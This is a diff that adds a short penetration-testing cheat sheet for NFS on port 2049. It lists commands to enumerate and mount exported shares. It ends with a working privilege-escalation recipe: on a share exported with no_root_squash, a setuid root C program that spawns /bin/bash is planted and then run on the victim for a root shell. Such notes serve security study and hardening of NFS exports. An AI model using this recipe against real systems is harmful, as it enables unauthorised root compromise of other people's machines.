@@ -1,0 +1,25 @@
+# NFS - 2049
+# Show Mountable NFS Shares
+showmount -e <IP>
+nmap --script=nfs-showmount -oN mountable_shares <IP>
+
+# Mount a share
+sudo mount -v -t nfs <IP>:<SHARE> <DIRECTORY>
+sudo mount -v -t nfs -o vers=2 <IP>:<SHARE> <DIRECTORY>
+
+# NFS misconfigurations
+# List exported shares
+cat /etc/exports
+
+#! IF no_root_squash/no_all_squash you may be able to privesc.
+# Attacker, as root user
+mkdir <DIRECTORY>
+mount -v -t nfs <IP>:<SHARE> <DIRECTORY>
+cd <DIRECTORY>
+echo 'int main(void){setreuid(0,0); system("/bin/bash"); return 0;}' > pwn.c
+gcc pwn.c -o pwn
+chmod +s pwn
+
+# Victim
+cd <SHARE>
+./pwn # Root shell
